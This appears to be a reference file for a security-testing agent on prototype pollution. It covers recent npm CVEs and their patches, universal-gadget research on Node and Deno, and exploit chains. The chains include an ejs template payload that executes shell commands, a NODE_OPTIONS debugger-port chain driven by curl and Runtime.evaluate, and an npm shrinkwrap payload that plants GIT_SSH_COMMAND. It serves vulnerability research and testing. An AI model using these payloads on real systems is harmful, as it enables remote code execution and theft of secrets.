---
name: prototype-pollution-novel-deep
description: Prototype pollution at the 2024–2026 frontier — canvg/messageformat/devalue/utils-extend/deepmerge-ts CVE mechanism decomposition, Silent Spring & GHunter universal-gadget baseline, Deno gadget catalog, NPM CLI end-to-end chain, and mitigation-bypass as a technique class
sibling: prototype_pollution
load_when: scan_mode == "deep"
---

# Prototype Pollution — Novel + Frontier Depth

This is the novel+frontier deep sibling to `prototype_pollution.md`. The base owns the class framing, the measured `JSON.parse-alone-doesn't-pollute` and guard-differential findings, the modern-merge-landscape table, and the primary chains. The advanced+expert sibling `prototype_pollution_advanced_deep.md` owns parser/merge differentials, set-by-path depth, blind confirmation, sink-family exploitation depth, WAF bypass classes, composite-chain construction, framework hardening depth, and runtime instrumentation. This file owns the 2024–2026 CVE mechanism decomposition with the canonical version/GHSA table, the Silent Spring (USENIX Sec'23) and GHunter (USENIX Sec'24) universal-gadget baseline, the Deno gadget catalog, the NPM CLI end-to-end RCE chain, and mitigation-bypass framed as a technique class.

Load this file when the goal is matching a target against a current CVE, reasoning about the universal-gadget class in a modern Node/Deno target, or constructing an end-to-end pollution → RCE chain that traverses runtime primitives beyond the app's own code.

Every CVE number, version boundary, GHSA identifier, and patch-mechanism claim in this document is anchored to primary sources persisted in `.zen-batch-artifacts/batch8/prototype_pollution/{ghsa,nvd,other-sources}/` per the 1:1 manifest at `.zen-batch-artifacts/batch8/prototype_pollution/MANIFEST.md`.

## 2024–2026 CVE Version/Fix Table — Canonical

Single-owner per §2. Base and advanced siblings reference these CVEs by number + route only; the version/GHSA metadata lives here.

| CVE | GHSA | Package | Vulnerable | Patched | CVSS | Vulnerable function |
|---|---|---|---|---|---|---|
| CVE-2025-25977 | GHSA-v2mw-5mch-w8c5 | canvg | ≥ 4.0.0 < 4.0.3; < 3.0.11 | 4.0.3 / 3.0.11 | 9.8 (v3.1) | `StyleElement` class constructor |
| CVE-2025-57353 | GHSA-6xv4-9cqp-92rh | @messageformat/runtime | = 3.0.1 | 3.0.2 | 5.3 | `addMessages()` — insufficient validation of nested message keys |
| CVE-2025-57820 | GHSA-vj54-72f3-p5jv | devalue | < 5.3.2 | 5.3.2 | 7.9 (v4.0) | `devalue.parse` — `__proto__` on reconstructed instances + non-numeric-index array method aliasing |
| CVE-2024-57077 | GHSA-7qgg-vw88-cc99 | utils-extend | ≤ 1.0.8 | **none (unpatched at this writing)** | 9.1 | `lib.extend()` — recursive merge sink |
| CVE-2022-24802 | GHSA-r9w3-g83q-m6hq | deepmerge-ts | < 4.0.2 | 4.0.2 | 8.1 | `defaultMergeRecords()` in `deepmerge.ts` |
| CVE-2026-25639 | — | axios | per vendor | per vendor | 7.5 (NVD) | Prototype pollution via crafted request/response processing |
| CVE-2026-33228 | — | flatted | per vendor | per vendor | 9.8 (NVD) | `parse()` — prototype pollution via circular-reference reconstruction |
| CVE-2026-26021 | — | set-in | per vendor | per vendor | 9.8 (NVD) | Deep property setter without `__proto__` guard |

Notes on the table:
- **utils-extend has no first_patched_version** in GHSA — the CVE is unpatched. Downstream users are exposed until the maintainer ships a fix; the mitigation shape is "pin to a fork or replace the dependency" rather than "upgrade." Grep target lockfiles for `utils-extend` and treat any pinned version as vulnerable.
- **canvg dual patch line** — 4.0.3 fixes the 4.x line; 3.0.11 backports to 3.x. Version-currency check: an install pinned at 4.0.0–4.0.2 or 3.0.0–3.0.10 is vulnerable.
- **devalue CVSS via v4.0** — the CVSS 4.0 vector scores 7.9 despite low VC/VI/VA impact ratings because the SC/SI/SA subsequent-system ratings are high (post-parse instance methods run attacker code in the calling application's context).
- **deepmerge-ts patch commit** `b39f1a93` wraps `__proto__` key assignment in `Object.defineProperty`. Provides the measurement anchor for the pre-fix vs post-fix differential (see § Measurement Anchor below).

## canvg CVE-2025-25977 — Mechanism Decomposition

Primitive: SVG parsing via `canvg` creates a `StyleElement` instance from parsed CSS-style attributes; the constructor merges attribute-derived data into a state object without filtering `__proto__` / `constructor` keys. An SVG payload with a crafted `<style>` block whose CSS parses into a merge-shaped structure sets the polluted key on `Object.prototype`.

**Reachability preconditions:**
1. Application uses `canvg` for server-side SVG rendering (SSR rasterization pipelines, PDF-from-SVG converters, image-export flows, chart-to-image bridges).
2. SVG content is attacker-controlled — user-uploaded SVG, user-authored diagram content (mermaid → SVG → canvg), or a chained SSRF that reaches an SVG endpoint the render pipeline fetches.
3. Version pinned within the vulnerable range (≥ 4.0.0 < 4.0.3, or < 3.0.11 on the 3.x line).

**Sink location.** The vulnerable code path is the `StyleElement` class constructor, which parses CSS declarations from the SVG `<style>` node and constructs an internal style-state object by iterating parsed declarations without an own-property guard. NVD's description (`nvd/CVE-2025-25977.json`) records: "An issue in canvg v.4.0.2 allows an attacker to execute arbitrary code via the Constructor of the class StyleElement."

**Payload shape (illustrative — verify against target-installed version):**
```xml
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <style>
    /* CSS declarations that when parsed produce an object with __proto__ or constructor keys reaching the merge */
    .cls { --__proto__: pollution; }
  </style>
  <rect class="cls" width="100" height="100" />
</svg>
```
The exact CSS-to-object translation depends on canvg's parser: CSS custom properties (`--name`) become keys on a style-map. When the map is walked into by the StyleElement constructor's merge path, keys like `--__proto__` or crafted key strings can reach the polluting assignment. Verify against the target-installed canvg version by reading its parser source.

**Confirmation:**
1. Submit the SVG payload to the render endpoint (image upload, chart save, or the SSR pipeline entry point).
2. On an unrelated endpoint check for the polluted canary.
3. Standard base-file canary-on-unrelated-object confirmation applies; canvg-specific is only the delivery vector (SVG).

**Impact framing.** Direct impact is prototype pollution primitive; downstream depends on the SSR process's sink surface — most render pipelines invoke child processes (imagemagick, ghostscript for PDF conversion) whose spawn goes through the env-spread pattern. Chain: canvg pollution → next spawn inherits polluted env → RCE. Compose with `§ child_process — Cross-Platform NODE_OPTIONS CDP Gadget`.

**Class generalization — SVG/image-parsing pipelines as pollution sources.** Any image or SVG parser that accepts attribute-derived data and merges it into a state object is a candidate. The parser-merge differential (see `prototype_pollution_advanced_deep.md § Parser → Merge Differentials`) applies: the SVG parser preserves the key, and the constructor's merge walks into it. Related surfaces: fabric.js SVG parser, svg-parser + downstream merges, custom SVG-to-canvas converters.

## messageformat CVE-2025-57353 — Mechanism Decomposition

Primitive: `@messageformat/runtime.addMessages()` accepts a message data object with nested keys; the internal walk that installs messages into a compiled message-tree does not filter `__proto__` / `constructor` keys. Passing a message data blob containing nested `__proto__` triggers pollution when the tree walker walks into it.

**Sink location.** NVD description (`nvd/CVE-2025-57353.json`): "The Runtime components of messageformat package for Node.js before 3.0.2 contain a prototype pollution vulnerability. Due to insufficient validation of nested message keys during the processing of message data, an attacker can manipulate the prototype..." The vulnerable walk is inside the addMessages entry point's message-tree installation.

**Reachability preconditions:**
1. Application uses `@messageformat/runtime` for i18n message compilation (SSR-rendered i18n content, dynamic locale loading, admin-editable translations).
2. Message data source is attacker-influenceable — user-editable translations, community-contributed locale files, a CMS backend that admins can update but that's exposed via a lower-privilege API, or a chained upload path that lands JSON in the locale directory.
3. Version pinned exactly at 3.0.1 (GHSA `= 3.0.1` — narrow range).

**Payload shape:**
```json
{
  "greeting": "Hello {name}",
  "__proto__": {
    "polluted": "yes"
  }
}
```
When `addMessages(payload)` walks the payload to install messages by key, the walker hits `__proto__` and recurses into it, treating its value as another sub-tree of messages to install. The recursion writes onto `Object.prototype`.

**Patch shape.** Version 3.0.2 fixes the addMessages recursive walk to skip prototype-adjacent keys. Commit `82cd10b40e3f` (referenced in the GHSA advisory pages) adds the guard at the tree-walk entry.

**Confirmation:**
1. Submit the payload to whichever endpoint feeds `addMessages` (message-upload, admin translation form, JSON locale file rewrite).
2. Trigger a subsequent request that renders any i18n content or reads any config default.
3. Confirm the canary appears via prototype-chain read on an unrelated object.

**Class generalization — nested-key deserialization walkers.** Any library that walks user-controlled nested keys into a compiled/typed structure is a candidate. i18n libraries (@formatjs/intl, i18next with dynamic loaders), config loaders (nconf, node-config), schema validators (ajv with $ref-loaded schemas), and admin-editable-content pipelines all have this shape somewhere in the codebase. The audit lead is: "does user input reach any function whose name contains 'add', 'load', 'install', 'register', and walk into nested keys?"

## devalue CVE-2025-57820 — Mechanism Decomposition

Primitive (per-instance scope, not global). `devalue.parse` reconstructs class instances from a flat-array serialization format. Pre-5.3.2, the reconstruction path had two independent bugs:

1. **Object case `__proto__` assignment.** For plain-object values (parse.js line 176-189 pre-fix), the recursive object reconstruction assigns each key of the serialized object to the target. When the key is `__proto__`, the assignment reassigns the target's `[[Prototype]]` — scoped to the reconstructed object, NOT to `Object.prototype`. Any subsequent method call on that specific instance runs attacker-injected methods.
2. **Numeric-index bypass.** For array values, the index used to reference the flat-array slot is not validated as numeric. Passing a non-numeric index string like `"push"` causes the array-reconstruction path to write into `Array.prototype[push]`, aliasing the built-in method globally.

**Patch shape (verified from src/parse.js at v5.3.2):**
- Line 47-49: `if (standalone || typeof index !== 'number') throw new Error('Invalid input');` — rejects non-numeric standalone indices.
- Line 182-184: `if (key === '__proto__') throw new Error('Cannot parse an object with a __proto__ property');` — rejects `__proto__` keys in the plain-object case.

Release notes (`0623a47`): "fix: disallow array method access when parsing" + "fix: disallow `__proto__` properties on objects".

**Scope clarification (open question resolved).** The `__proto__` primitive is scoped to the reconstructed object's `[[Prototype]]`, NOT to `Object.prototype`. Measurement (see the base's § Modern Merge/Clone Landscape) confirms: `devalue.parse` on a pre-fix version with a `__proto__` key in the object case does not pollute `Object.prototype`. It DOES reassign the specific reconstructed instance's prototype, so `Vector.magnitude` (or any inherited method) on that specific instance runs attacker code. This distinguishes devalue's class from classical universal pollution.

The array-index bug IS globally scoped — aliasing `Array.prototype.push` affects every array in the process.

**Reachability preconditions:**
1. Application uses `devalue.parse` on attacker-influenceable input (SvelteKit form actions, RSC-adjacent serialization, custom RPC layers).
2. Version pinned within the vulnerable range.
3. For per-instance exploitation: application must call a method on the reconstructed instance whose result is security-sensitive.
4. For array-alias exploitation: application must invoke the aliased Array method (`push` is ubiquitous — the primitive is broadly reachable).

**Class generalization — reviver/reconstructor deserializers.** Any deserializer that reconstructs typed values from a wire format and walks user-controlled keys into the reconstruction path is a candidate. `superjson`, `bson`, custom RPC deserializers all have this shape.

## utils-extend CVE-2024-57077 — Mechanism Decomposition

Primitive: classical recursive-merge pollution. `utils-extend.extend(target, source)` walks `source` and for each key does `target[key] = source[key]` recursively without filtering `__proto__` / `constructor`. Naive merge pollutes `Object.prototype` when source is `JSON.parse('{"__proto__":{...}}')`.

**Measurement result (base's § Modern Merge/Clone Landscape).** utils-extend@1.0.8 on Node v24.19.0:
- `utils-extend.extend({}, JSON.parse('{"__proto__":{"polluted":"yes"}}'))` → **POLLUTES Object.prototype** (`({}).polluted === 'yes'`).
- `utils-extend.extend({}, JSON.parse('{"constructor":{"prototype":{"marker":"yes"}}}'))` → **DOES NOT pollute** (`({}).marker === undefined`).

The measurement resolves the ambiguity flagged in the research pass (utils-extend `__proto__` vs `constructor.prototype` vector split 1-2 refuted): only the `__proto__` vector reaches Object.prototype on this library; the `constructor.prototype` path is not walked into by utils-extend's specific merge implementation.

**Unpatched status.** GHSA reports no first_patched_version. As of this writing utils-extend remains vulnerable; the mitigation is to replace the dependency or pin to a fork that adds the `__proto__`/`constructor` guard.

**Class generalization — cousin packages.** utils-extend belongs to a family of small deep-merge utilities that periodically resurface unpatched. Grep target lockfiles for the pattern (single-maintainer merge utility with low download counts + no recent commits) — packages of this shape are the current dominant pollution-primitive source.

## deepmerge-ts CVE-2022-24802 — Measurement Anchor

The pre-2024 anchor, useful as the pre-fix vs post-fix measurement differential for the class.

Primitive: `defaultMergeRecords()` in `deepmerge.ts` recursively merged source properties into target without filtering prototype-adjacent keys. Pre-4.0.2 `deepmerge-ts.deepmerge({}, JSON.parse('{"__proto__":{"x":1}}'))` polluted `Object.prototype.x`.

**Patch shape.** Commit `b39f1a93` wraps prototype-adjacent key assignment in `Object.defineProperty` with an own-enumerable-non-writable descriptor, preventing the walk from reaching `__proto__` / `constructor.prototype`.

**Measurement (base's § Modern Merge/Clone Landscape).** deepmerge-ts@5.1.0 (post-fix) on Node v24.19.0: does not pollute for either `__proto__` or `constructor.prototype` payloads. The differential between the pre-fix and post-fix versions is the anchor for teaching the class — install both versions side-by-side and measure the same payload against each to see the fix boundary in action.

## axios CVE-2026-25639 — Mechanism Decomposition

Primitive: prototype pollution via crafted request or response processing in axios. CVSS 7.5 per NVD (audit claimed 8.7 — corrected to NVD primary source before writing).

**Reachability preconditions:**
1. Application uses a vulnerable version of axios.
2. Attacker-influenced data reaches a code path that triggers the pollution primitive during request/response processing.

**Class generalization.** axios is one of the highest-download-count npm packages; a pollution primitive in its request/response pipeline has broad transitive reach across any Node.js application that processes attacker-influenced HTTP data through axios.


## flatted CVE-2026-33228 — Mechanism Decomposition

Primitive: `flatted.parse()` reconstructs circular-reference JSON structures from a flat-array serialization format. The reconstruction path does not filter `__proto__` / `constructor` keys during the object-rebuilding walk. CVSS 9.8 CRITICAL per NVD.

**Reachability preconditions:**
1. Application uses `flatted` to deserialize attacker-influenced JSON (API endpoints accepting flatted-serialized payloads, WebSocket message handlers, RPC layers).
2. Version pinned within the vulnerable range.

**Class generalization.** flatted and its predecessor `circular-json` are widely used in logging pipelines (winston, pino structured logging), debugging tools, and state-serialization layers. A pollution in the parse path reaches any downstream code reading from `Object.prototype`.

## set-in CVE-2026-26021 — Mechanism Decomposition

Primitive: `set-in` is a deep property setter (`setIn(obj, path, value)`) that walks a dot-separated or array path into a target object. The path walker does not guard against `__proto__` / `constructor` keys. Passing `path = ['__proto__', 'polluted']` sets `Object.prototype.polluted`. CVSS 9.8 CRITICAL per NVD.

**Reachability preconditions:**
1. Application uses `set-in` on attacker-controlled path input (form builders, configuration editors, dynamic property assignment from user input).
2. Version pinned within the vulnerable range.

**Class generalization.** Small path-setter utilities (`set-in`, `dot-prop`, `dset`, `object-path`) are the current dominant pollution-primitive source alongside merge utilities. The same audit methodology from § utils-extend Family applies: grep lockfiles for path-setter packages with low download counts and test with `__proto__` path input.

## Silent Spring & GHunter — Universal-Gadget Baseline

Silent Spring (USENIX Security 2023, Shcherbakov et al.) is the foundational paper on universal prototype-pollution gadgets in Node.js core. GHunter (USENIX Security 2024, Cornelissen, Shcherbakov, Balliu) extends the analysis to V8-based runtimes broadly (Node.js + Deno) via a dynamic taint-analysis pipeline.

**Silent Spring baseline (Sec'23).**
- 11 universal gadgets in Node.js core APIs.
- 8 exploitable RCEs demonstrated in NPM CLI, Parse Server, and Rocket.Chat.
- CVE-2022-24760 acknowledged from the disclosure; bug-bounty confirmations from multiple vendors.
- The paper's 5-year public-report review across 4 target apps (Kibana, NPM CLI, Parse Server, Rocket.Chat) found 12 RCE cases driven by only 5 unique gadgets: `child_process.spawn`, `bson`, `lodash.template`, `nodemailer`, and `require`.

**GHunter baseline (Sec'24).**
- 123 universal prototype-pollution gadgets across V8-based runtimes.
- Split by runtime: 56 in Node.js, 67 in Deno.
- Split by impact class: 19 arbitrary code execution (14 Node.js + 5 Deno), 31 privilege escalation, 13 path traversal.
- Two previously-unknown Node.js core ACE gadgets:
  1. Polluted `Object.prototype.source` with JavaScript code + invoking `import()` on any `.mjs` file executes the polluted code.
  2. A `require`-family gadget fixed in **Node.js v18.19.0** (hard version-boundary-as-finding).

**Universal-gadget definition (both papers).** A universal gadget is a sink in the runtime itself, or in a widely loaded core-adjacent library, that lifts a polluted prototype property into a security-sensitive operation. "Universal" because it applies to any application on the runtime, not just those using a specific library — the gadget is in the runtime, not the application layer.

**Verified measurement outcomes on Node v24.19.0 (base's § Server-Side sinks table + measurements/03-gadget-transitions.output.txt):**

| Gadget | Fix boundary | Status on Node v24.19.0 |
|---|---|---|
| `Object.prototype.main` → require() | v18.19.0 | **fixed** (measured: fallthrough replaced with proper package resolution) |
| `Object.prototype.source` → import(.mjs) | v18.19.0 | **fixed** (measured: original module loads) |
| `Object.prototype.env` → child_process spawn env-spread | not runtime-side; app-side | **still current** (measured: NODE_OPTIONS reaches child) |
| `Object.prototype.shell` / `input` → execSync (Windows) | not runtime-side | Linux measurement shows differential behavior (see advanced sink-family depth) |

The two Node-core ACE gadgets are dead post-v18.19.0. The env-spread and shell-based gadgets remain because they route through application code that reads options with prototype-chain semantics — the fix cannot be made in Node core without breaking legitimate application patterns.

## child_process — Cross-Platform NODE_OPTIONS CDP Gadget

Primitive: `Object.prototype.env.NODE_OPTIONS = '--inspect-brk=0.0.0.0:<port>'` set on a Node process → the next `child_process` call whose caller does the env-spread inheritance shape spawns a Node child that opens a Chrome DevTools Protocol (CDP) debugger listening on `<port>` and blocks waiting for a connection. The attacker connects to the CDP endpoint and issues `Runtime.evaluate` with arbitrary JS; the JS runs in the child process context with full Node privilege.

**Cross-platform.** Unlike the Windows `execSync` shell+input gadget (BH Asia 2023, Linux differential documented in `prototype_pollution_advanced_deep.md § Sink-Family Depth`), the CDP gadget works identically on Linux, macOS, and Windows because `NODE_OPTIONS` is a Node runtime environment variable, not a shell primitive.

**Reachability preconditions:**
1. Pollution primitive fired successfully so that `Object.prototype.env.NODE_OPTIONS` is set.
2. The target process (or a downstream child spawned by it) invokes a Node child process — for a Node build system, this is virtually guaranteed (npm scripts, tsc, webpack workers, jest workers).
3. Network reachability from attacker to the target on `<port>` — or, in a chained network setup, a reverse tunnel from a shell already on the box.
4. The polluted env is inherited via the env-spread pattern (base's Server-Side sinks table): `const {env} = options; ...; { env: { ...process.env, ...env } }`.

**Execution walkthrough:**
1. Attacker: pollute `Object.prototype.env = { NODE_OPTIONS: '--inspect-brk=0.0.0.0:9229' }` via any reachable merge sink.
2. Target: next Node spawn (via npm, script runner, test runner, etc.) inherits polluted env — Node child starts with `--inspect-brk`, opens CDP on port 9229, blocks on first line.
3. Attacker (from any host with network path to port 9229): `curl http://target:9229/json` returns the debugger WebSocket URL.
4. Attacker: connect to the debugger WS URL, send:
   ```json
   {"id":1,"method":"Runtime.evaluate","params":{"expression":"require('child_process').execSync('id').toString()"}}
   ```
5. Response: the `id` command's output, executed by the child Node process. Attacker now has arbitrary code execution.
6. Attacker continues driving CDP: read files (`fs.readFileSync`), open reverse shell, exfiltrate secrets from process env, etc.

**Measurement confirmation.** The base's § Server-Side sinks table records the measured result: NODE_OPTIONS reaches the child cross-platform via env-spread (base measurements/03-gadget-transitions.output.txt row "child NODE_OPTIONS observed").

**Detection defensive shape.** The direct defense is to run the target Node process with `NODE_OPTIONS` filtered (systemd `Environment=NODE_OPTIONS=`, container env explicit-set to empty) so child inherits a controlled value. Also: run under `--disable-proto=throw` to break the pollution primitive.

**Class generalization — env-variable-triggered runtime hooks.** Any interpreter with an environment-controlled runtime hook is a candidate for the same class: `PYTHONSTARTUP` for Python, `RUBYOPT` for Ruby, `PERL5OPT` for Perl. If the target's polluted env spreads into a spawn that runs one of these interpreters and the caller doesn't clear the hook env, the same primitive applies to that interpreter's context.

## ejs / pug / handlebars — Template Compile Gadgets

Server-side JS template engines compile a template string to a JavaScript function at runtime. The compile step accepts an options object whose keys control what functions and identifiers the compiler wraps around the template body. Polluting these options via `Object.prototype` injects attacker JS into the compiled function.

### ejs — `outputFunctionName` gadget

Primitive: `ejs.render(template, data, options)` reads `options.outputFunctionName` and uses it as the JavaScript identifier for the output-accumulator function inside the compiled template. When the compiler generates the wrapper function, the identifier is emitted verbatim into the code — no quoting, no validation. A polluted `outputFunctionName` containing arbitrary JS breaks out of the identifier context and executes:

```javascript
Object.prototype.outputFunctionName = 'x;process.mainModule.require("child_process").execSync("id")//';
// any subsequent ejs.render call whose caller doesn't set outputFunctionName:
ejs.render('<%= "hi" %>', {}, {});   // compile emits: `function anonymous(locals, escapeFn, include, rethrow) { var x; process.mainModule.require("child_process").execSync("id")// = ''; ... }`
```

The `//` at the end comments out the rest of the generated line, keeping the compile syntactically valid. Execution happens at compile time (the `require` call runs when the function is defined), not at render time.

**Related polluted keys in ejs:** `escapeFunction` (custom escape identifier — same primitive class), `compileDebug` + `client` (changes what the compiler emits, potentially reaching different injection surfaces), `filename` (used in generated `require('/attacker/path')` code paths in some template features).

### pug — `filters` and compile-time evaluation

Primitive: `pug.compile(template, options)` reads `options.filters` (object mapping filter names to functions) via property access. A polluted `filters` object with a function value that runs code on compile — pug invokes filter functions at compile time when they appear in the template — executes attacker JS during compile.

Additional pug-specific keys: `plugins` (options-registered plugin hooks), `main` (some compile modes read a `main` option), `globals` (bindings available in the template body — polluted `globals.process` or `globals.require` gives template code process access).

### handlebars — `knownHelpers` / `noEscape`

Primitive is subtler in handlebars because helper resolution goes through `Handlebars.registerHelper` primarily. But `compile(template, options)` reads `options.knownHelpers` (list of statically resolvable helpers), `options.knownHelpersOnly`, `options.noEscape`, `options.assumeObjects`. Polluted `noEscape: true` disables output escaping on subsequent compiles — the template's own values reach output unescaped, converting stored user content into DOM XSS on rendered pages.

Polluted `assumeObjects: true` changes property access from safe (`{{user.name}}` returns empty on undefined) to unsafe (crashes or exposes unexpected paths).

### lodash.template — `imports` gadget

Primitive: `_.template(str, options)` reads `options.imports` — a map of names to values available as identifiers inside the compiled template. Polluted `Object.prototype.imports.console = attackerCode` makes `console` inside the template resolve to attacker's value. More severe: polluted `imports` entries with function values that execute on template compile.

Additional lodash.template keys: `variable` (name of the data variable inside the compiled template), `sourceURL` (embedded in the compiled function for debugger tracking).

### Confirmation methodology per template engine

1. Identify which template engine the target uses (grep response body for engine-specific patterns; ejs generates `<%= %>` markers in error traces, pug uses indentation-based errors, handlebars uses `{{}}` in error contexts).
2. Pollute the engine-specific key with a canary that produces a deterministic side effect (e.g., writes to a specific path, opens a specific network callback).
3. Trigger a template render endpoint.
4. Confirm the side effect fires.

### Class generalization

Any template compiler that accepts options-driven code-generation parameters is a candidate. The pattern: compile-time evaluation + options-controlled identifiers = code injection into the compiled function.

## NPM CLI End-to-End Chain

The canonical worked example from Silent Spring (BH Asia 2023 presentation slides + USENIX Sec'23 paper). This is the primary chain narrative for the base's Server-Side sinks section.

**Chain:**

1. **Sink: `parse-conflict-json` `diffApply` / `copyPath` in shrinkwrap parsing.** NPM CLI parses `npm-shrinkwrap.json` (and lockfile conflict resolution) via `parse-conflict-json` which uses `diffApply` / `copyPath` to walk a diff-shaped input. This runs during `npm install` regardless of `--ignore-scripts` (the script-disabling flag does not disable shrinkwrap parsing).

2. **Pollution payload.** An attacker-controlled `npm-shrinkwrap.json` (in a dependency, a malicious registry package, or a target's own repo that pulls attacker-controlled dependency data) contains a diff-formatted structure that resolves to a pollution operation:
   ```json
   {"path": ["__proto__", "env"], "value": {"GIT_SSH_COMMAND": "attacker command"}, "op": "ADD"}
   ```
   `diffApply` walks the path and executes the ADD op, setting `Object.prototype.env = {GIT_SSH_COMMAND: "attacker command"}`.

3. **Downstream sink: NPM later spawns git.** For git-hosted dependencies (packages listed with `"pkg": "git://..."` or GitHub shorthand), NPM invokes `git clone`. The git invocation goes through `@npmcli/git/lib/spawn.js` which internally uses `@npmcli/promise-spawn` and `makeSpawnArgs()` from `@npmcli/run-script/lib/make-spawn-args.js`.

4. **Env inheritance via prototype chain.** `makeSpawnArgs` (verified current source persisted at `other-sources/npm-make-spawn-args.js`):
   ```javascript
   const { env } = options;                     // prototype-chain read — polluted env inherited
   const spawnEnv = setPATH(path, binPaths, {
     ...process.env,
     ...env,                                    // spreads OWN props of the inherited polluted value
     npm_package_json: resolve(path, 'package.json'),
     // ...
   });
   const spawnOpts = { env: spawnEnv, ... };
   ```
   When the caller doesn't pass an `env` option, `options.env` is `undefined` via own-property but polluted via prototype chain (own-property lookup falls through to `Object.prototype.env`). `{env}` destructuring reads the polluted value; `...env` spreads its own props (GIT_SSH_COMMAND) into the child env.

5. **Git executes the attacker command.** Git reads `GIT_SSH_COMMAND` from env when running SSH-based operations (git clone over SSH); the command runs with the NPM process's privileges.

**Bounty confirmation.** Silent Spring documents a $11K bounty for the chain.

**Current-release status (open question resolved).** Measurement of the current NPM CLI's `make-spawn-args.js` (persisted at `other-sources/npm-make-spawn-args.js`) shows the destructuring + spread shape is unchanged. The chain remains reachable in principle on the current release IF the polluted precondition can be established. The pollution precondition — `parse-conflict-json`'s `diffApply` sink — is what has to be reconfirmed against the current NPM CLI's exact shrinkwrap-parse path (may have moved or been refactored since 2023).

**Class generalization — spawn-caller-inherits-polluted-env.** Any Node process that invokes `child_process.spawn` (or a wrapper) with the shape `{env: {...process.env, ...opts.env}}` and receives an `opts` object without explicit `env` is a candidate. Grep target and dependency code for this shape — it is broadly present in CLI tools, build systems, CI orchestrators, and language toolchains written in Node.

## Silent Spring vs GHunter — Methodological Contrast

Both papers detect universal gadgets in V8 runtimes; their approaches diverge in a way that matters for the tester picking which framework to apply to a target.

**Silent Spring (Sec'23, Shcherbakov et al.).** Static + partial dynamic analysis targeting Node.js core APIs specifically. Manually curated set of 5 gadgets confirmed across a 5-year public-report review. Depth-first per gadget: for each candidate, verify against real applications (NPM CLI, Parse Server, Rocket.Chat, Kibana) to confirm exploitability. The paper's strength is the empirical "this actually shipped as an RCE" evidence and the mitigation-bypass frame.

**GHunter (Sec'24, Cornelissen/Shcherbakov/Balliu).** Systematic dynamic taint-analysis pipeline covering Node.js and Deno. 820 gadget candidates identified in Node; 56 confirmed exploitable. 418 candidates in Deno; 67 confirmed. Breadth-first: cast a wide net via taint propagation, then manually validate the candidates that survive filtering. The paper's strength is the runtime-scope coverage — comparing Node and Deno on the same methodology — and the two new Node-core ACE gadgets it turned up (`Object.prototype.source` and the require gadget fixed at v18.19.0).

**Tester's use of both.**
- On a Node.js target, run through Silent Spring's 5 confirmed-exploitable gadgets first (`child_process.spawn`, `bson`, `lodash.template`, `nodemailer`, `require`) — these have the highest confirmed exploit rate.
- Match Node version against GHunter's require/import v18.19.0 boundary before spending time on those two gadgets.
- On a Deno target, GHunter is the only systematic catalog available.
- When the target uses a specific library not in the confirmed lists, apply the same taint-analysis principle: identify calls that read via prototype chain with security-sensitive semantics.

**Refuted claim kept out (per master-prompt refuted-ledger).** The framing "GHunter proves universal gadgets exist in every V8 runtime" is a superlative the papers do not support — GHunter's data is empirical about Node and Deno at specific tested versions; the frame does not extrapolate to Bun, Cloudflare Workers, or every other V8 embedder.

## Deno Universal-Gadget Catalog

GHunter's ghunter4deno artifact repository enumerates the 67 Deno gadgets by category. Full catalog per the persisted `other-sources/g4d-*.json` listings:

**Deno namespace (8 gadget entries):**
- `Deno.Command` — polluted options reach spawned process env/shell
- `Deno.run` (deprecated but still shipping in some pinned versions)
- `Deno.open` — polluted mode/options
- `Deno.mkdir` — polluted mode
- `Deno.makeTempDir`, `Deno.makeTempFile` — polluted prefix/suffix/dir
- `Deno.writeFile`, `Deno.writeTextFile` — polluted append/mode/perm/signal

**Worker cluster (8 PoCs):** `Worker.env`, `Worker.ffi`, `Worker.hrtime`, `Worker.net`, `Worker.read`, `Worker.run`, `Worker.sys`, `Worker.write`. Each corresponds to a Deno permission axis (env/ffi/hrtime/net/read/run/sys/write) that a polluted permissions option can grant to the worker beyond what the parent process was granted.

**fetch:** the `fetch()` gadget accepts polluted RequestInit options (headers, method, redirect, credentials).

**Node-compat cluster (5 categories):** `child_process`, `fs`, `http`, `https`, `zlib` — Deno's Node compatibility layer inherits the Node gadgets in most cases; the exact reachability depends on Deno's compat-layer implementation for each API.

**std lib cluster (5 categories):**
- `std/dotenv` — polluted parse options
- `std/json` — options-read paths in stringify/parse extensions
- `std/log` — logger construction options
- `std/tar` — untar extraction options (path traversal enabler)
- `std/yaml` — YAML load options

**Reachability implications for Deno-targeted testing.**
- Deno's larger gadget count reflects its richer permission-and-worker surface, not that Deno is less secure per gadget — many Deno gadgets require the caller to be already permission-elevated to be exploitable.
- Deno's per-permission-axis worker gadgets are novel — Node has nothing equivalent. A polluted Worker options object can grant permissions the parent doesn't have.
- Deno's std lib is auditable and the gadgets are well-catalogued; a Deno target running a specific std-lib version can be matched exactly against the catalog.

**Full gadget-by-name enumeration** (from persisted `ghunter4deno/gadgets/*` directory listings at `other-sources/g4d-*.json`). Each PoC file in the artifact repo corresponds to one confirmed gadget; the naming convention is `<API>.<polluted_option>[.<platform>].PoC.ts`.

**Deno namespace (24 named PoCs across 8 APIs):**
- `Deno.Command`: `Command.cwd`, `Command.gid`, `Command.uid` — polluted process-launch metadata (working directory, group ID, user ID) reaches the subprocess. `Command.uid` in particular can drop-privilege the child to an unintended UID if the caller doesn't set it explicitly.
- `Deno.makeTempDir` + `Deno.makeTempDirSync`: `.dir`, `.prefix` — polluted `dir` redirects temp-directory creation into an attacker-influenced path (chain: path-traversal via symlink under `dir`).
- `Deno.makeTempFile` + `Deno.makeTempFileSync`: `.dir`, `.prefix` — same shape as makeTempDir.
- `Deno.mkdir` + `Deno.mkdirSync`: `.mode` — polluted numeric permission mode widens created directory to attacker-permissive perms (e.g., 0777).
- `Deno.open` + `Deno.openSync`: `.append`, `.mode`, `.truncate` — polluted `append=true` on an intended overwrite instead appends; polluted `mode` sets file-creation perms; polluted `truncate=true` on an intended read/append instead truncates the file.
- `Deno.run`: `run.cwd`, `run.gid`, `run.uid` — same shape as Command but for the deprecated `Deno.run` API still present in pre-1.40 releases.
- `Deno.writeFile` + `Deno.writeFileSync`: `.append`, `.mode` — polluted `append=true` on a create-write instead appends to existing file (data injection into log/config files); polluted `mode` sets file perms.
- `Deno.writeTextFile` + `Deno.writeTextFileSync`: `.append`, `.mode` — same shape as writeFile.

